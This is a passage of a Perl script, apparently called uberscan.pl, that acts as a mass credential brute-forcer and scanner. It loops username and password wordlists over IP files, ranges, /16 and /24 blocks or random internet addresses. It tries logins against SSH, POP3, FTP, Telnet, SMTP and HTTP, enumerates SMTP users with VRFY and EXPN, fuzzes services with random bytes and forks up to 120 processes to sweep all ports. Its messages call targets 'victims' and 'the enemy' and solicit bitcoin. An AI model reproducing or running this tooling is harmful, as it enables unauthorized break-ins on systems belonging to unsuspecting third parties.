		print "\n You won't see me again as this loops until you break out, unless";
		print "\n the -maxmins: option has been set, although a seperate subroutine";
		print "\n handles that so... bye bye!";
		random_ip();
		NagBitcoin();
		die "\n\n\n In the unlikely event you see this, something has gone VERY WRONG with the universe! \n\n\n";
	}
	elsif ($ip_option =~ '-iprange:')	{
		print "\n Searching for a banner / open port in IP range between $first_ip and $second_ip";
		print "\n Here comes range_gen()";
		range_gen();
		print "\n Back from range_gen!\n";
		NagBitcoin();
		die "\n\n Finished searching for a banner / open ports in IP range between $first_ip and $second_ip \n\n\n";
	}
}
	


##############  Execute if vanilla, single username and password, IPs from file ################

if (($username_option =~ '-user:'||$username_option eq "-userblank") && 
($password_option =~ '-pass:' || 
 $password_option eq '-passblank' || 
 $scantype eq "smtp" || 
 $scantype eq "SMTP")
 &&
($ip_option eq 'undefined' ||
 $ip_option =~ '-ipfile:'))	{
	print "\n Username option: $username_option \n Password_option: $password_option\n";
	print "ip_filename is $ip_filename";
	print "\n Just processing a single username and password / blank password, no-frillz scan\n";
	print "\n Ready to execute GetSomeIPFileCrack()\n";
	GetSomeIPFileCrack();
	print "\n Back from GetSomeIPFileCrack \n";
	NagBitcoin();
	die "\n\n Finished cracking contents of $ip_filename with username $username and password $password \n\n";
}


############## Execute if vanilla single username / password, ips from ipblock #################
if (($username_option =~ '-user:'||$username_option eq "-userblank") 
 && 
($password_option =~ '-pass:'|| 
 $password_option eq '-passblank' ||
 $scantype eq "smtp" || 
 $scantype eq "SMTP")
 &&
($ip_option =~ '-ipblock:'))	{
	print "\n      ******************************************************";
	print "\n      * Starting no frillz scan on ipblock $ip_input! *";
	print "\n      ******************************************************\n";
	ipblock_gen();
	NagBitcoin();
	die "\n Executed ipblock scan on port $port with username $username and password $password \n\n";
}

	



############## Execute if vanilla single username / password, ips from iprange ###############
if (($username_option =~ '-user:'||$username_option eq "-userblank")
&& 
($password_option =~ '-pass:'|| 
 $password_option eq '-passblank' || 
 $scantype eq "smtp" || 
 $scantype eq "SMTP") 
 &&
($ip_option =~ '-iprange:'))	{
	print "\n		***************************************";
	print "\n		* No frillz scan on iprange beginning *\n";
	print "\n		***************************************\n";
	range_gen();
	print "\n Returned from the range_gen() \n";
	NagBitcoin();
	die "\n Executed iprange scan with username $username and password $password \n";
}


############## Execute if vanilla single username / password, random ips ######################
if (($username_option =~ '-user:'||$username_option eq "-userblank") 
 && 
($password_option =~ '-pass:'||
 $password_option eq '-passblank' ||
 $scantype eq "smtp" || 
 $scantype eq "SMTP")
 &&
 ($ip_option =~ '-random_ip'))	{
	print "\n No frillz scan on random ips beginning\n";
	random_ip();
}

############## Execute if vanilla single username / password, single IP ######################
if (($username_option =~ '-user:'||$username_option eq "-userblank")
 && 
($password_option =~ '-pass:'||
 $password_option eq '-passblank'||
 $scantype eq "smtp" || 
 $scantype eq "SMTP") 
 &&
($ip_option =~ '-ipsingle:'))	{
	print "\n No frillz scan on single ip beginning\n";
	HackMaster();
}


################ Execute if single username, passwords from file ##############################


if (($username_option =~ '-user:'||$username_option eq "-userblank")
 && 
$password_option =~ '-passfile:'
 &&
$ip_option =~ '-random_ip')	{
	print "\n Username option: $username_option \n Password_option: $password_option\n";
	print "ip_input is $ip_input";
	print "\n Processing a single username and passwords from $passfile in random mode\n";
	random_ip();
	print "\n\n";
	die "How did I get here???";
}
elsif (($username_option =~ '-user:'||$username_option eq "-userblank")
 && 
$password_option =~ '-passfile:')	{
	print "\n Now to search for username $username trying passwords from file $passfile \n";
	print "\n The IP option is $ip_option, it may search in filename $ip_filename so don't forget to code for that!\n";
	$wordlist_filename = $passfile;
	ReadWordListFile();
	@password_array = @word_array;
	$numofpasswords = scalar @password_array;
	until ($password_count == $numofpasswords)	{
		print "#\tCurr. password\n";
		print "$password_count\t$password_array[$password_count]";
		$password = "$password_array[$password_count]";
		print "\n username is $username, password is $password, ready to crack! \n";
		if ($ip_option eq 'undefined' || $ip_option =~ '-ipfile:')	{
			print "\n Username option: $username_option \n Password_option: $password_option\n";
			print "ip_filename is $ip_filename";
			print "\n Processing a single username and passwords from $passfile, one-frill scan\n";
			print "\n Ready to execute GetSomeIPFileCrack()\n";
			GetSomeIPFileCrack();
		}
		elsif ($ip_option =~ '-iprange:')	{
			print "\n Username option: $username_option \n Password_option: $password_option\n";
			print "first_ip is $first_ip, second_ip is $second_ip";
			print "\n Processing a single username and passwords from $passfile, one-frill scan\n";
			print "\n Ready to execute range_gen()\n";
			range_gen();
		}
		elsif ($ip_option =~ '-ipblock:')	{
			print "\n Username option: $username_option \n Password_option: $password_option\n";
			print "ip_input is $ip_input";
			print "\n Processing a single username and passwords from $passfile, one-frill scan\n";
			print "\n Ready to execute ipblock_gen()\n";
			ipblock_gen();
		}
		elsif ($ip_option =~ '-ipsingle:')	{
			print "\n Username option: $username_option \n Password_option: $password_option\n";
			print "ip_input is $ip_input";
			print "\n Processing usernames from $userfile, one-frill scan\n";
			print "\n Ready to search on single ip() \n";
			HackMaster();
		}
		else	{
			print "\n*************************************************************\n";
			print "SEVERE ERROR: You've input things wrong! \n";
			print "input[0] \t\t input[1] \t\t input[2]\n";
			print "$input[0] \t\t $input[1]    $input[2]\n";
			print "\n";
			print " input[3] \t\t input[4] \n";
			print " $input[3] \t\t $input[4] \n";
			print "\n*************************************************************\n";
			die "input error, crashed deep in the program!";
		}		
		$password_count++;
		print "\n";
	}
	NagBitcoin();
	die "\n ** Executed password wordlist routine, comrade! ** \n ";
}




################ Execute if usernames from file ##############################

if ($username_option =~ '-userfile:' 
&&
($password_option =~ '-pass:'||
 $password_option =~'-passblank' ||
 $scantype eq "smtp" || 
 $scantype eq "SMTP")
 &&
$ip_option =~ '-random_ip')	{
	print "\n Username option: $username_option \n Password_option: $password_option\n";
	print "ip_input is $ip_input";
	print "\n Processing usernames from $userfile with a single password in random mode\n";
	#print "\n\n CANNOT PERFORM THIS FUNCTION YET, as it hasn't been developed.\n";
	#NagBitcoin();
	#print "\n (Basically, send some bitcoin my way and I'll make it happen.)";
	#print "\n Every little helps!";
	#print "\n\n";
	#die "\n\n";
	random_ip();
}

elsif ($username_option =~ '-userfile:' 
&&
($password_option =~ '-pass:'||
 $password_option =~'-passblank' ||
 $scantype eq "smtp" || 
 $scantype eq "SMTP"))	{
	print "\n Now to search for usernames from file $userfile \n";
	print "\n The IP option is $ip_option, it may search in filename $ip_filename so don't forget to code for that!\n";
	$wordlist_filename = $userfile;
	ReadWordListFile();
	@username_array = @word_array;
	$numofusernames = scalar @username_array;
	until ($username_count == $numofusernames)	{
		print "#\tCurr. word\n";
		print "$username_count\t$username_array[$username_count]";
		$username = "$username_array[$username_count]";
		print "\n username is $username, password is $password, ready to crack! \n";
		if ($ip_option eq 'undefined' || $ip_option =~ '-ipfile:')	{
			print "\n Username option: $username_option \n Password_option: $password_option\n";
			print "ip_filename is $ip_filename";
			print "\n Processing usernames from $userfile, one-frill scan\n";
			print "\n Ready to execute GetSomeIPFileCrack()\n";
			GetSomeIPFileCrack();
		}
		elsif ($ip_option =~ '-iprange:')	{
			print "\n Username option: $username_option \n Password_option: $password_option\n";
			print "first_ip is $first_ip, second_ip is $second_ip";
			print "\n Processing usernames from $userfile, one-frill scan\n";
			print "\n Ready to execute range_gen()\n";
			range_gen();
		}
		elsif ($ip_option =~ '-ipblock:')	{
			print "\n Username option: $username_option \n Password_option: $password_option\n";
			print "ip_input is $ip_input";
			print "\n Processing usernames from $userfile, one-frill scan\n";
			print "\n Ready to execute ipblock_gen()\n";
			ipblock_gen();
		}
		elsif ($ip_option =~ '-ipsingle:')	{
			print "\n Username option: $username_option \n Password_option: $password_option\n";
			print "ip_input is $ip_input";
			print "\n Processing usernames from $userfile, one-frill scan\n";
			print "\n Ready to search on single ip() \n";
			HackMaster();
		}
		else	{
			print "\n*************************************************************\n";
			print "FATAL ERROR: You've input something wrong! \n";
			print "input[0] \t\t input[1] \t\t input[2]\n";
			print "$input[0] \t\t $input[1]    $input[2]\n";
			print "\n";
			print " input[3] \t\t input[4] \n";
			print " $input[3] \t\t $input[4] \n";
			print "\n*************************************************************\n";
			die "input error, crashed deep in the program!";
		}
		$username_count++;
		print "\n";
	}
	NagBitcoin();
	die "\n \n Finished cracking usernames from $userfile, what a hero! \n \n";
}



######################### Execute if usernames and passwords both come from file ##############################


if ($username_option =~ '-userfile:' && $password_option =~ '-passfile:'
 &&
$ip_option =~ '-random_ip')	{
	print "\n Username option: $username_option \n Password_option: $password_option\n";
	print "ip_input is $ip_input";
	print "\n Processing usernames from $userfile and passwords from $passfile in random mode\n";
	#print "\n\n CANNOT PERFORM THIS FUNCTION YET, as it hasn't been developed.\n";
	#NagBitcoin();
	#print "\n (Basically, send some bitcoin my way and I'll make it happen.)";
	#print "\n Every little helps!";
	#print "\n\n";
	#die "\n\n";
	random_ip();
}
elsif ($username_option =~ '-userfile:' && $password_option =~ '-passfile:')	{
	print "\n Now to search for usernames in file $userfile trying passwords from file $passfile";
	print "\n The IP option is $ip_option, don't forget to code for it! \n";
	$wordlist_filename = $userfile;
	ReadWordListFile();
	@username_array = @word_array;
	$numofusernames = scalar @username_array;
	print "\n username_count:$username_count numofusernames:$numofusernames";
	until ($username_count == $numofusernames)	{
		print "#\tCurr. username\n";
		print "$username_count\t$username_array[$username_count]";
		$username = "$username_array[$username_count]";
		$wordlist_filename = $passfile;
		ReadWordListFile();
		@password_array = @word_array;
		$numofpasswords = scalar @password_array;
		print "\n password_count:$password_count numofpasswords:$numofpasswords";
		until ($password_count == $numofpasswords)	{
			print "#\tCurr. password\n";
			print "$password_count\t$password_array[$password_count]";
			$password = "$password_array[$password_count]";
			print "\n username is $username, password is $password, ready to crack! \n";
			if ($ip_option eq 'undefined' || $ip_option =~ '-ipfile:')	{
				print "\n Username option: $username_option \n Password_option: $password_option\n";
				print "ip_filename is $ip_filename";
				print "\n Processing usernames from $userfile, one-frill scan\n";
				print "\n Ready to execute GetSomeIPFileCrack()\n";
				GetSomeIPFileCrack();
			}
			elsif ($ip_option =~ '-iprange:')	{
				print "\n Username option: $username_option \n Password_option: $password_option\n";
				print "first_ip is $first_ip, second_ip is $second_ip";
				print "\n Processing usernames from $userfile, one-frill scan\n";
				print "\n Ready to execute range_gen()\n";
				range_gen();
			}
			elsif ($ip_option =~ '-ipblock:')	{
				print "\n Username option: $username_option \n Password_option: $password_option\n";
				print "ip_input is $ip_input";
				print "\n Processing usernames from $userfile, one-frill scan\n";
				print "\n Ready to execute range_gen()\n";
				ipblock_gen();
			}
			elsif ($ip_option =~ '-ipsingle:')	{
				print "\n Username option: $username_option \n Password_option: $password_option\n";
				print "ip_input is $ip_input";
				print "\n Processing usernames from $userfile, one-frill scan\n";
				print "\n Ready to search on single ip() \n";
				HackMaster();
			}
			else	{
				print "\n*************************************************************\n";
				print "FATAL ERROR: You've input something wrong! \n";
				print "input[0] \t\t input[1] \t\t input[2]\n";
				print "$input[0] \t\t $input[1]    $input[2]\n";
				print "\n";
				print " input[3] \t\t input[4] \n";
				print " $input[3] \t\t $input[4] \n";
				print "\n*************************************************************\n";
				die "input error, crashed deep in the program!";
			}
			$password_count++;
		}
		$password_count = 0;	
		$username_count++;
		print "\n";
	}
}


#########################################################################################################
print "\n";
print "Scan completed.";
print "\n";
print "For debugging purposes or in case the scan did not complete, your main parameters were:\n";
print "\n scantype:$scantype";
print "\n ip_option:$ip_option";
print "\n username_option:$username_option";
print "\n username:$username";
print "\n password_option:$password_option";
print "\n password:$password";
print "\n\n You entered:";
print "\n   uberscan.pl @input";
print "\n\n";
NagBitcoin();
die "\n Aaaand we have reached the end of the program. \n";

#########################################################################################
######################### SUBROUTINES! ##################################################
#########################################################################################



######################  GetSomeIPFileCrack ##############################################

sub GetSomeIPFileCrack {

	print "\n Here's some lovely, lovely crack!";
	print "\n Also, the username is $username and the password is $password";
	print "\n Don't smoke it all at once now! ;-) \n";
	ReadIPFile();
	print " \n Back in GetSomeIPFileCrack. ip_array:\n @ip_array \n";
	$numofips = scalar @ip_array;
	print "\n There are $numofips to scan \n";
	$ip_count = 0;
	until ($ip_count == $numofips)	{
		$remote_host = $ip_array[$ip_count];
		$ip_count++;
		print "\n Current host is number $ip_count of $numofips: $remote_host \n";
		HackMaster();
	}
	print "\n Completed mission sir! Now it's home for tea and medals! \n";
}



########################### HackMaster ##################################


sub HackMaster	{
	
	my $megahack_pid;
	my $number_of_forks = 0;
	my $last_port;
	my $qtimeout = ($timeout / 4);
	my $htimeout = ($timeout / 2);	
	
	my $fuzz_prompt;
	my $max_fuzz_len;

	print "\n*************************************************************";
	print "\n**  HACKMASTER HACKMASTER HACKMASTER HACKMASTER HACKMASTER **";
	print "\n*************************************************************";


	print "\n\n String to send_option:+$string_to_send_option+";
	if ($string_to_send_option eq "-sendstring:random")	{
		print "\n*************************************************************";
		print "\n***     Rolling some garbage to throw at the enemy...     ***";
		print "\n*************************************************************";
		$fuzz_prompt = "";
		unless ($random_string_length > 0) {
			$max_fuzz_len = int(rand(256));
			print "\n Random length of random string will be $max_fuzz_len";
		}
		else	{
			print "\n Length of random string user set to $random_string_length";
			$max_fuzz_len = $random_string_length;
		}
		print "\n Characters generated: ";
		until (length( $fuzz_prompt ) == $max_fuzz_len)	{
			$fuzz_prompt .= chr(int(rand(256)));		# 
			#print STDOUT length( $fuzz_prompt ).",";# Misleading output!
		}
		print "\n  Random string generated!\n";
		print "\n  Fuzz output:$fuzz_prompt";
		#push @server_conversation, $fuzz_prompt;
		#print "\n  Server_conversation:@server_conversation";
		$string_to_send = $fuzz_prompt;
	}				
		
	if ($port eq "random")	{$remote_port = int(rand(65535));}

	if ($forktimes == 0){$times_looped++;}	# Only increment $times_looped here if not multitasking! 
	statistics();

	# unless -noportscan selected or running the error_correct (retry) routine,
	#  do a quick check of the appropriate port

	# if random mode is selected, test for username and password count as well
	# as random IP mode handles username / password attempts differently
	# to other IP modes.

	print "\n **** DEBUGGING: remote_port:$remote_port ***** \n";
	print "\n **** DEBUGGING: scantype:$scantype ***** \n";
	print "\n **** DEBUGGING: port_scan_option:$port_scan_option ***** \n";
	
	if ($remote_port eq "all" 
	|| $remote_port eq "reserved" 
	|| $remote_port eq "dynamic" 
	|| $scantype eq "udp"
	|| $scantype eq "searchopen")	{
		$port_scan_option = "OFF";
	}
	
	
	### Current problem: That fucking PortScan routine. ##
	## (IT'S NOT EVEN A PROPER PORTSCAN - JUST CHECKS FOR A CONNECTION) ##
	# Seems  to work now... test it later!

	if ($ip_option =~ '-random_ip' &&
	#($scantype ne "udp" ||			# If there are probs in future, could be this
	#$remote_port ne "all" ||		# and this 
	#$remote_port ne "reserved") &&	# and this
	  $port_scan_option eq "ON" && $running_error_correct eq "NO" && 
	  #$scantype ne "searchopen" &&
	 ($password_count == 0 &&	# Replaced a || with && - if it don't work, put || back
	  $username_count == 0))	{
		print "\n Checking to see if target $remote_host even exists...";
		PortScan();
		print "\n Back from PortScan()";
		print "\n port_test:$port_test\n";
		if ($port_test eq "FAILED")	{
			print "\n **** Portscan failed, no further hacking on this IP ****\n";
			return;
		}
	}
	elsif ($ip_option !~ '-random_ip' &&
		#$scantype ne "searchopen" &&
	#($scantype ne "udp" ||			# If there are probs in future, could be this
	#$remote_port ne "all" ||		# and this
	#$remote_port ne "reserved") &&	# and this
	  $port_scan_option eq "ON" && $running_error_correct eq "NO")	{
		print "\n Not in random mode. Checking to see if target $remote_host even exists...";
		PortScan();
		print "\n Back from PortScan()";
		print "\n port_test:$port_test\n";
		if ($port_test eq "FAILED")	{
			print "\n **** Portscan failed, no further hacking on this IP ****\n";
			return;
		}
	}

#	do some naughty things
print "\n HackMaster: Hacking victim number $ip_count (where applicable):\n $remote_host on port $remote_port with user $username and password $password \n\n";
	
	if ($remote_port eq "all" || $remote_port eq "reserved" || $remote_port eq "dynamic")	{
		
		if ($remote_port eq "all")	{
			$remote_port = 0;
			$last_port = 65535;
		}
		if ($remote_port eq "reserved")	{
			$remote_port = 0;	
			$last_port = 1024;
		}
		if ($remote_port eq "dynamic")	{
			$remote_port = 49152;
			$last_port = 65535;
		}
		
		$megahack = "MEGAHACK ON";
		until ($remote_port > $last_port)	{			# FORK IT HERE FOR PORTSCAN MEGAHACK
			until ($number_of_forks == 120 || $remote_port > $last_port)	{ 		# see what this does

				$megahack_pid = fork();
				if ($megahack_pid == 0)	{
							
					print "\n I'm the child, PID $$ ";
					if ($scantype eq "udp" || $scantype eq "UDP")	{HackUDP();}
					elsif ($scantype eq "banner" || $scantype eq "Banner" || $scantype eq "BANNER")	{HackBanner();}
					# TCP connect? Have to adjust banner hack. BIG JOB! SAD! 

				#	#elsif ($scantype eq "SSH" || $scantype eq "ssh")	{HackSSH();}
				#	#elsif ($scantype eq "POP3" || $scantype eq "pop3")	{HackPOP3();}
				#	#elsif ($scantype eq "FTP")	{HackFTP();}	# Not gonna fuck around with ftp
				#	#elsif ($scantype eq "Telnet" ||	$scantype eq "telnet" || $scantype eq "TELNET")	{HackTelnet();}
				#	#elsif ($scantype eq "SMTP"|| $scantype eq "smtp")	{
				#	#	$usernamelogon = "vrfy $username\n";
				#	#	HackSMTP();
				#	#}
				#	#elsif ($scantype eq "HTTP" || $scantype eq "http")	{HackHTTP();}
					#wait();
					exit();
				}
				else	{
					print "\n *********************************************";
					print "\n * INCREMENTING REMOTE PORT:CURRENTLY $remote_port *";
					print " ";
					$remote_port++;
					print " ";
					print "\n *************** NOW $remote_port ***************";
					print "\n *********************************************";
					
				}
				$number_of_forks++;
				#print "\n*************************************\n 40forks:$number_of_forks \t remote_port:$remote_port\n**********************************************\n";
				#print "\n Waiting....";
				#print "\n";
				#wait();				# with this it's  125 /30s
				#print "\n************\n";
				#print "* Reaping....*";
				#print "\n************\n";
				#$SIG{CHLD} = 'IGNORE';
			}
			print "\n";
			print "OUT OF FORTYFORKS ROUTINE! \t remote_port:$remote_port";
			print "\n";
			$number_of_forks = 0;
			#print "\n*************\n*Waiting....*\n************";
			#print "\n";
			#wait();			# Back in the 390s
			#if ($scantype eq "banner" || $scantype eq "Banner" || $scantype eq "BANNER")	{
				
				statistics();
				statistics();
				print "\n *********** Waiting $qtimeout seconds for things to settle.... ************";
				print "\n *********** Waiting $qtimeout seconds for things to settle.... ************";
				print "\n *********** Waiting $qtimeout seconds for things to settle.... ************";
				print "\n *********** Waiting $qtimeout seconds for things to settle.... ************";
				print "\n *********** Waiting $qtimeout seconds for things to settle.... ************";
				sleep $qtimeout;	
				statistics();
				print "\n";
				print "\n ******************** THE WAIT IS OVER! *************************";
				print "\n ******************** THE WAIT IS OVER! *************************";
				print "\n ******************** THE WAIT IS OVER! *************************";
				print "\n ******************** THE WAIT IS OVER! *************************";
				print "\n ******************** THE WAIT IS OVER! *************************";
				print "\n ******************** THE WAIT IS OVER! *************************";
				statistics();
				
			#}
			statistics();
			print "\n************\n";
			print "* Reaping....*";
			print "\n************\n";
			$SIG{CHLD} = 'IGNORE';	# Practice safe programming...
			#print "\n";
			#print "Sleeping....";
			#print "\n";
			#sleep 1;		#	gOES up to 2500-ish procs in 5 mins with this in
							# 390-odd in 30s without... 2373 in 5 without
			
			
		}
		print  "Awaiting timeout of $timeout...";
		statistics();
		print "\n *********** Waiting $timeout seconds for things to settle.... ************";
		print "\n *********** Waiting $timeout seconds for things to settle.... ************";
		print "\n *********** Waiting $timeout seconds for things to settle.... ************";
		print "\n *********** Waiting $timeout seconds for things to settle.... ************";
		print "\n *********** Waiting $timeout seconds for things to settle.... ************";
		print "\n *********** Waiting $timeout seconds for things to settle.... ************";
		sleep $qtimeout;
		statistics();
		print "\n *********** Waited $qtimeout seconds, waiting some more... ************";
		print "\n *********** Waited $qtimeout seconds, waiting some more... ************";
		print "\n *********** Waited $qtimeout seconds, waiting some more... ************";
		print "\n *********** Waited $qtimeout seconds, waiting some more... ************";
		print "\n *********** Waited $qtimeout seconds, waiting some more... ************";
		sleep $qtimeout;
		statistics();
		print "\n *** Waited $htimeout seconds, just another $htimeout to go.... ***";
		print "\n *** Waited $htimeout seconds, just another $htimeout to go.... ***";
		print "\n *** Waited $htimeout seconds, just another $htimeout to go.... ***";
		print "\n *** Waited $htimeout seconds, just another $htimeout to go.... ***";
		print "\n *** Waited $htimeout seconds, just another $htimeout to go.... ***";
		print "\n *** Waited $htimeout seconds, just another $htimeout to go.... ***";
		sleep $qtimeout;
		statistics();
		print "\n *********** Almost finished, $qtimeout secs left of $htimeout ************";
		print "\n *********** Almost finished, $qtimeout secs left of $htimeout ************";
		print "\n *********** Almost finished, $qtimeout secs left of $htimeout ************";
		print "\n *********** Almost finished, $qtimeout secs left of $htimeout ************";
		print "\n *********** Almost finished, $qtimeout secs left of $htimeout ************";
		sleep $qtimeout;	
		statistics();
		print "\n";
		print "\n ******************** WAIT OVER- ALL DONE! *************************";
		print "\n ******************** WAIT OVER- ALL DONE! *************************";
		print "\n ******************** WAIT OVER- ALL DONE! *************************";
		print "\n ******************** WAIT OVER- ALL DONE! *************************";
		print "\n ******************** WAIT OVER- ALL DONE! *************************";
		print "\n ******************** WAIT OVER- ALL DONE! *************************";
		print "\n ******************** WAIT OVER- ALL DONE! *************************";
		#$remote_port = "all"; Is that actually neccesary?
	}
	elsif ($scantype eq "udp" || $scantype eq "UDP")	{
		print "\n Doing udp search...";
		HackUDP();
		error_correct();
	}
	elsif ($scantype eq "banner" || $scantype eq "Banner" || $scantype eq "BANNER")	{
		print "\n Doing Banner search...";
		HackBanner();
		error_correct();
	}
	
	elsif ($scantype eq "searchopen" || $scantype eq "Searchopen" || $scantype eq "SEARCHOPEN")	{
		print "\n Searching for open ports...";
		SearchOpen();
	}
	
	elsif ($scantype eq "Custom" || $scantype eq "custom" || $scantype eq "CUSTOM")	{
		print "\n Doing custom hack (sending custom string, etc)...";
		HackCustom();
		error_correct();
	}
	elsif ($scantype eq "SSH" || $scantype eq "ssh")	{
		print "\n Doing SSH hack...";
		HackSSH();
		error_correct();
	}
	elsif ($scantype eq "POP3" || $scantype eq "pop3")	{
		print "\n Doing POP3 hack...";
		HackPOP3();
		error_correct();
	}
	elsif ($scantype eq "FTP" && 
	$ftpanon ne '-ftpanon' || 
	$scantype eq "ftp" && 
	$ftpanon ne '-ftpanon')	{
		print "\n Doing vanilla FTP hack... \n";
		HackFTP();
		error_correct();
	}
	elsif ($scantype eq 'FTP' && 
	$ftpanon eq '-ftpanon' || 
	$scantype eq "ftp" && 
	$ftpanon eq '-ftpanon')	{
		$username = "ftp";
		$password = 'a'.int(rand(256)).int(rand(256)).int(rand(256)).'@gmail.com';
		print "\n Generated password: $password for username $username, hacking FTP \n";
		HackFTP();
		error_correct();
		$username = "anonymous";
		$password = 'a'.int(rand(256)).int(rand(256)).int(rand(256)).'@gmail.com';
		print "\n Generated password: $password for username $username, hacking FTP \n";
		HackFTP();
		error_correct();
		print "\n\n";
	}
	elsif ($scantype eq "Telnet" ||
	$scantype eq "telnet" || 
	$scantype eq "TELNET")	{
		HackTelnet();
		error_correct();
	}
	elsif ($scantype eq "SMTP" && 
	$smtpbug ne '-smtpbug' || 
	$scantype eq "smtp" && 
	$smtpbug ne '-smtpbug')	{
		$usernamelogon = "vrfy $username\n";
		print "\n Generated SMTP command $usernamelogon, hacking SMTP...\n";
		HackSMTP();
		error_correct();
	}
	elsif ($scantype eq "SMTP" && 
	$smtpbug eq '-smtpbug' || 
	$scantype eq "smtp" && 
	$smtpbug eq '-smtpbug')	{
		$usernamelogon ="expn all\n";
		HackSMTP();
		error_correct();
		$usernamelogon ="vrfy all\n";
		HackSMTP();
		error_correct();
		$usernamelogon ="debug\n";
		HackSMTP();
		error_correct();
	}
	elsif ($scantype eq "HTTP" || $scantype eq "http")	{
			HackHTTP();
			error_correct();
	}
	else	{
		PrintScanOptions();
		die;
	}
}



################################# READWORDLISTFILE #######################################

sub ReadWordListFile {

	my @wordlist_array ="";
	my $wordlist_string = "";
	my $wordlist_file_wait = 0;
	my $old_dollarbar;

	print "\n Doing the wordlist thing \n";
	print "Opening $wordlist_filename...\n";
	$filename = $wordlist_filename;
	$verbal_report = " Opening wordlist, an error shouldn't be critical ";

	open (WORDLIST, "< $wordlist_filename") or die "\n\n *** Objectivity lost - worldlist file $wordlist_filename not found! **\n ";
	$old_dollarbar = local $|;
	until (flock(WORDLIST, LOCK_SH | LOCK_NB) )	{
		local $| = 1;			# dont forget to put this back!
		print "\n Waiting for lock on $wordlist_filename, looped $wordlist_file_wait times";
		flock (WORDLIST, LOCK_SH) or die "\n\n\n Damn it, can't get lock on $wordlist_filename... \n\n";
		print "\n Got file $filename yaaay!";
		$wordlist_file_wait++;
	}
	local $| = $old_dollarbar; 	# Puts back old $| variable

	@wordlist_array = <WORDLIST>;
	close (WORDLIST);
	#flock(WORDLIST, LOCK_UN) or die "\n what fresh hell is this??? \n\n\n"; # Uncomment this if you get a lot of errors using this routine

	$wordlist_string = join  ("", @wordlist_array);
	print "\n Wordlist read. Raw file is: \n\n$wordlist_string";
	@word_array = ($wordlist_string =~ /(\S+)/g);
	print "\n\n Words to use (newline-seperated and deodorized for your convenience & satisfaction) are:\n";
	print join("\n",@word_array),"\n";
	print "\n Right, that's the end of the wordlist thing. byeee...\n";
}


####################################### READIPFILE #########################################
sub ReadIPFile {
	my $ip_file_wait = 0;
	my $old_dollarbar;

	print "\n Reading file....";
	$verbal_report = "Opening IP file, this should be chill ";
	
	open (INPUT, "< $ip_filename") or die "\n\n ** Objectivity lost - file $ip_filename not found! ** \n\n";
	$old_dollarbar = local $|;	
	until (flock(INPUT, LOCK_SH | LOCK_NB) )	{
		local $| = 1;			# dont forget to put this back!
		print "\n Waiting for lock on $ip_filename, looped $ip_file_wait times";
		flock (INPUT, LOCK_SH) or die "\n\n\n Damn it, can't get lock on $ip_filename... \n\n";
		print "\n Got file $ip_filename yaaay!";
		$ip_file_wait++;
	}
	local $| = $old_dollarbar; 	# Puts back old $| variable

	@filecontents_array = <INPUT>;
	close (INPUT);
	flock (INPUT, LOCK_UN);
	$filecontents_string = join ("", @filecontents_array);
	print "File read. File is:\n $filecontents_string";

	@ip_array = ($filecontents_string =~ /(\d+\.\d+\.\d+\.\d+)/g);
	print "\n IPs to scan are...  \n";
	print join("\n",@ip_array),"\n";
}


##################################### IPBLOCK_GEN ##########################################
sub ipblock_gen	{
	# Generate a list of ip addresses from slash notation
	# Only does /16 and /24s right now, from a nnn.nnn.0.0 base
	# Want more? Bitcoins to:
	#
	#  1PEDKUiUTxGNJ3XTPfXCTAjpzVzX1VZAme
	#
	# If I accumulate one bitcoin, I WILL MAKE A BETTER ONE!
	#
	
	our $generated_ip = "undefined";
	my @split_ip = "undefined";

	my $seperator = '1';
	my ($one,$two,$three,$four) = "undefined";
	my $bits = "undefined";
	my $number = 0;
	my $number2 = 0;

	@ip_array = split (/\//, $ip_input);
	print "\n ip_input: $ip_input";
	print "\n ip_array: @ip_array";
	print "\n ip_array[0]: $ip_array[0]";
	print "\n ip_array[1]: $ip_array[1]\n ";

	#### Test for slightly shitty input, ie 192.168.1./24
	if (substr ($ip_array[0], (length($ip_array[0])-1)) eq "." )	{
		chop $ip_array[0];		# Just chop off that last "." if it exists
	}
	
	$bits = (32-$ip_array[1]);

	print "\n This is a $bits -bit ip block. \n";

	unless ($bits == 8 || $bits == 16) {
				die "\n\n Sorry, can only do 8 bit IP blocks for now. \n Usage: ipblock_gen 192.168.0./24 \n\n";
	}

	print "creating IP block....\n";

	if ($bits == 8)	{
		until ($number==256)	{
			$generated_ip = $ip_array[0].".".$number;
			print "Generated IP: $generated_ip \n";
			$remote_host = $generated_ip;
			HackMaster();
			$number++;
		}
	}
	elsif ($bits == 16)	{
		@split_ip = split(/\./, $ip_array[0]);
		print "split_ip: @split_ip \n";
		print "split_ip[0]: $split_ip[0]\n";
		print "split_ip[1]: $split_ip[1]\n";
		print "split_ip[2]: $split_ip[2]\n";
		print "split_ip[3]: $split_ip[3]\n";
		print "split_ip[4]: $split_ip[4]\n";

		until ($number == 256)	{
			$generated_ip = $split_ip[0].'.'.$split_ip[1].'.'.$number.'.'.$number2.".";
			until($number2 == 256)	{
				$generated_ip = $split_ip[0].'.'.$split_ip[1].'.'.$number.'.'.$number2;
				print "Generated ip: $generated_ip \n";
				$remote_host = $generated_ip;
				HackMaster();
				$number2++;
			}
			$number++;			
			$number2 = 0;
		}
	}
	print "\n  ********  IPBLOCK_GEN SUBROUTINE FINISHED ***********\n";
}



############################### RANGE_GEN #########################################

sub range_gen	{

	my $last_ip = "undefined";
	my $current_ip = "undefined";
	my @ip_array_one = "undefined";
	my @ip_array_two = "undefined";
	my $third_octet_kludge = "OFF";
	@ip_array_one = split (/\./, $first_ip);

	print "\n From IP: @ip_array_one";
	@ip_array_two = split (/\./, $second_ip);
	print "\n To IP:   @ip_array_two";

	$current_ip = join (".", @ip_array_one);
	print "\nCurrent_ip:$current_ip";

	$last_ip = join (".", @ip_array_two);
	print "\n second_ip:$second_ip";
	print "\n last_ip:$last_ip";

	my $fourth_octet = $ip_array_one[3];
	my $third_octet = $ip_array_one[2];
	my $second_octet = $ip_array_one[1];
	my $first_octet = $ip_array_one[0];

	print "\nfirst_octet:$first_octet second_octet:$second_octet third_octet:$third_octet fourth_octet:$fourth_octet\n";

	if ($first_octet < $ip_array_two[0])	{
		print "This uses all four octets!\n";
		die "\n *** Sorry, that functionality is not available yet! ***\n\n";
	}
	elsif ($second_octet < $ip_array_two[1])	{
		print "\n This uses three out of four octets! \n";
		die "\n *** Sorry, that functionality is not available yet! ***\n\n";
	}
	elsif ($third_octet < $ip_array_two[2])	{
		print "this uses two out of four octets!";
		$third_octet--;
		until ($third_octet == 255 || $current_ip eq $last_ip )	{
			$third_octet++;
